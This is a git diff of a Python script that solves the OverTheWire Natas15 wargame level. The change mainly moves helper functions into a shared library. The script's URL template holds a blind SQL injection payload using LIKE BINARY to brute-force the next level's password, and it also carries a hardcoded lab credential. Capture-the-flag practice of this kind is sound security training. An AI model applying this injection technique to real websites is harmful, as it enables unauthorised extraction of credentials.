@@ -1,7 +1,4 @@
 #!/usr/bin/python
-import string
-import requests
-import sys
 
 # Brute force script for Natas15
 #
@@ -12,14 +9,18 @@ import sys
 # For more details check:
 # http://www.geeksengine.com/database/basic-select/like-operator.php
 
+import sys, os 
+sys.path.append(os.path.join(os.path.dirname(__file__), ".."))  
+
+from lib.utils import write, check_pass
+
+import string
+import requests
+
+
 natas_url = ("http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
              "@natas15.natas.labs.overthewire.org?"
              "username=natas16\" and password LIKE BINARY {}")
-
-
-def write(input_):
-    sys.stdout.write(input_)
-    sys.stdout.flush()
 
 
 def get_letters():
@@ -66,22 +67,10 @@ def crack_key(letters):
     return password
 
 
-def double_check(key):
-    double_check_url = ("http://natas16:{}@natas16.natas.labs.overthewire.org?"
-                        .format(key))
-
-    response = requests.get(double_check_url)
-
-    if response.status_code == requests.codes.ok:
-        write("\nPassword checked!")
-    else:
-        write("\nWrong password!")
-
-
 def crack_it():
     letters = get_letters()
     key = crack_key(letters)
-    double_check(key)
+    write(check_pass("natas16.natas.labs.overthewire.org", "natas16", key))
 
 
 if __name__ == "__main__":
